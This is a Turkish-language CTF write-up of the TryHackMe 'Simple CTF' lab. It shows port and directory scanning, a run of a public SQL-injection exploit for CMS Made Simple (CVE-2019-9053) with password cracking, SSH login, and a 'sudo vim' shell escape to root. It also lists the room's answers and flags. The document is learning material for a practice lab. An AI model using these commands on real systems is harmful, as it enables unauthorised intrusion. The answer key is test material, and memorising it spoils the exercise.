---
title: Simple CTF
date: 2024-03-27 13:01:13
categories: [TryHackMe]
tags: [Easy,Security]  
image: https://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png
---

<a href="https://tryhackme.com/room/easyctf">Simple CTF</a>


nmap taraması başlatalım:

```bash
┌──(root㉿r3tr0)-[~]
└─# nmap -T5 -v -sV -p- 10.10.118.25
```

nmap çıktısı:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-14 01:12 EST
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 01:12
Scanning 10.10.118.25 [4 ports]
Completed Ping Scan at 01:12, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:12
Completed Parallel DNS resolution of 1 host. at 01:12, 0.00s elapsed
Initiating SYN Stealth Scan at 01:12
Scanning 10.10.118.25 (10.10.118.25) [65535 ports]
Discovered open port 80/tcp on 10.10.118.25
Discovered open port 21/tcp on 10.10.118.25
SYN Stealth Scan Timing: About 21.89% done; ETC: 01:15 (0:01:51 remaining)
Discovered open port 2222/tcp on 10.10.118.25
SYN Stealth Scan Timing: About 56.59% done; ETC: 01:14 (0:00:47 remaining)
Completed SYN Stealth Scan at 01:14, 92.02s elapsed (65535 total ports)
Initiating Service scan at 01:14
Scanning 3 services on 10.10.118.25 (10.10.118.25)
Completed Service scan at 01:14, 6.20s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.118.25.
Initiating NSE at 01:14
Completed NSE at 01:14, 0.41s elapsed
Initiating NSE at 01:14
Completed NSE at 01:14, 0.36s elapsed
Nmap scan report for 10.10.118.25 (10.10.118.25)
Host is up (0.089s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.41 seconds
           Raw packets sent: 131138 (5.770MB) | Rcvd: 71 (2.852KB)
```

1000 portunun altında kaç hizmet çalışıyor?

- 2

En yüksek portta hangi hizmet çalışıyor?

- ssh

80 portunda websitesi çalışıyor siteyi kontrol edelim.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a1.png?raw=true)

Sıradan ubuntu default sayfası. 

Gobuster çalıştırarak gizli dizin arayalım.

```bash
┌──(root㉿r3tr0)-[~]
└─# gobuster dir -u http://10.10.118.25/ -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

Gobuster çıktısı:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.118.25/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 313] [--> http://10.10.118.25/simple/]
```

simple sayfasını buluyoruz.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a2.png?raw=true)

Siteyi incelediğimizde CMS Made Simple 2.2.8 versiyonu kullanıldığını görüyoruz.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a3.png?raw=true)


Google'a gidip "CMS Made Simple 2.2.8 exploit" ifadesini aratarak bu sürümle ilgili herhangi bir şey olup olmadığına bakalım.


Sonuçlara baktığımızda, Exploit-DB'de aramamızla eşleşen ve CVE-2019–9053 kullanan bir SQL enjeksiyon saldırısına atıfta bulunan bir sayfa görüyoruz.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a4.png?raw=true)

Uygulamaya karşı kullandığınız CVE nedir?

- CVE-2019-9053


Uygulama ne tür bir güvenlik açığına karşı savunmasızdır?

- SQLi

Exploit'i indirelim ve çalıştıralım.

```bash
┌──(root㉿r3tr0)-[/home/kali/Downloads]
└─# python3 46635.py
[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
```

Bizden istediği parametreleri girelim.

```bash
┌──(root㉿r3tr0)-[/home/kali/Downloads]
└─# python3 46635.py -u http://10.10.118.25/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a5.png?raw=true)

Kullanıcı adı ve şifreyi buluyoruz.

Şifre nedir?
- secret

Elde edilen bilgilerle nereden giriş yapabilirsiniz?
- SSH

SSH ile makineye bağlanalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a6.png?raw=true)

user bayrağını alalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a7.png?raw=true)

Kullanıcı bayrağı nedir?

`G00d j0b, keep up!`

Yetki yükselmeye geçelim. Öncelikle mevcut kullanıcının neyi çalıştırabileceğini görmek için “sudo -l” komutunu çalıştıralım.

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

“Mitch” kullanıcısının /usr/bin/vim'i şifre olmadan çalıştırabildiğini görüyoruz. Bu bilgilerle GTFOBins'e göz atalım ve bunu privesc için kullanıp kullanamayacağımıza bakalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a8.png?raw=true)

sudo vim -c ':!/bin/sh' komutunu kullanarak yetki yükseltebiliriz.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/SimpleCTF/images/a9.png?raw=true)

Root bayrağı nedir?

`W3ll d0n3. You made it!`

![fsoc](/images/fsoc.gif)
